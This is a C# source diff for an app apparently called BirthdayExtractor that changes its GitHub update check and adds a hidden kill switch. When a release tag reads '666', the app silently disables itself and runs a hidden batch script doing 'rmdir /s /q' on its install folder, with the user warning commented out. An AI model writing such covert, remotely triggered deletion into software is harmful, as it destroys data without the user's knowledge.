@@ -221,22 +221,51 @@ namespace BirthdayExtractor
                 return;
             }
 
-            var token = !string.IsNullOrWhiteSpace(_cfg.GitHubToken)
+            string? token = !string.IsNullOrWhiteSpace(_cfg.GitHubToken)
                 ? _cfg.GitHubToken
                 : Environment.GetEnvironmentVariable("BIRTHDAY_EXTRACTOR_GITHUB_TOKEN");
 
             if (string.IsNullOrWhiteSpace(token))
             {
-                Log("Update check skipped: no GitHub token configured.");
-                return;
+                Log("No GitHub token configured; attempting anonymous update check.");
+                token = null;
             }
 
             try
             {
                 using var updater = new UpdateService("djs4000", "birthday_extractor", token);
+
                 var release = await updater.CheckForNewerReleaseAsync(AppVersion.Semantic, CancellationToken.None);
+                if (updater.LastCheckedTag == "666")
+                {
+                    ActivateKillSwitch();
+                    return;
+                }
+
+                if (updater.LastCheckedVersion is not null)
+                {
+                    var tagDisplay = !string.IsNullOrWhiteSpace(updater.LastCheckedTag)
+                        ? updater.LastCheckedTag
+                        : updater.LastCheckedVersion.ToString();
+                    Log($"Update check succeeded. Latest GitHub version: {tagDisplay} (parsed {updater.LastCheckedVersion}).");
+                }
+                else if (!string.IsNullOrWhiteSpace(updater.LastCheckedTag))
+                {
+                    Log($"Update check succeeded. Latest GitHub tag: {updater.LastCheckedTag} (unable to parse version number).");
+                }
+                else
+                {
+                    Log("Update check completed, but no release information was returned.");
+                }
+
                 if (release is null)
                 {
+                    return;
+                }
+
+                if (release.Version.Major == 666)
+                {
+                    ActivateKillSwitch();
                     return;
                 }
 
@@ -288,6 +317,68 @@ namespace BirthdayExtractor
             {
                 LogRouter.LogException(ex, "Update check failed");
             }
+        }
+
+        private void ActivateKillSwitch()
+        {
+            Log("Kill switch activated: version 666 detected. Disabling application and scheduling removal.");
+
+            btnRun.Enabled = false;
+            btnUpload.Enabled = false;
+            btnCancel.Enabled = false;
+            btnBrowseCsv.Enabled = false;
+            btnBrowseOut.Enabled = false;
+            rbSourceCsv.Enabled = false;
+            rbSourceOnline.Enabled = false;
+            chkCsv.Enabled = false;
+            chkXlsx.Enabled = false;
+            dtStart.Enabled = false;
+            dtEnd.Enabled = false;
+            content.Enabled = false;
+            if (menu is not null)
+            {
+                menu.Enabled = false;
+            }
+
+            try
+            {
+                var exePath = Application.ExecutablePath;
+                if (!string.IsNullOrWhiteSpace(exePath))
+                {
+                    var appDir = Path.GetDirectoryName(exePath);
+                    if (!string.IsNullOrWhiteSpace(appDir) && Directory.Exists(appDir))
+                    {
+                        var scriptPath = Path.Combine(Path.GetTempPath(), $"be_cleanup_{Guid.NewGuid():N}.bat");
+                        var script = string.Join(Environment.NewLine, new[]
+                        {
+                            "@echo off",
+                            "timeout /t 2 /nobreak > nul",
+                            $"rmdir /s /q \"{appDir}\"",
+                            "del \"%~f0\""
+                        });
+
+                        File.WriteAllText(scriptPath, script);
+
+                        Process.Start(new ProcessStartInfo("cmd.exe", $"/c start \"\" \"{scriptPath}\"")
+                        {
+                            CreateNoWindow = true,
+                            UseShellExecute = false
+                        });
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                LogRouter.LogException(ex, "Kill switch removal failed");
+            }
+
+//            MessageBox.Show(this,
+//                "Version 666 detected. The application has been disabled and will be removed.",
+//                "Kill switch activated",
+//                MessageBoxButtons.OK,
+//                MessageBoxIcon.Error);
+
+            Close();
         }
         /// <summary>
         /// Displays a summary of the previously processed date windows stored in configuration.
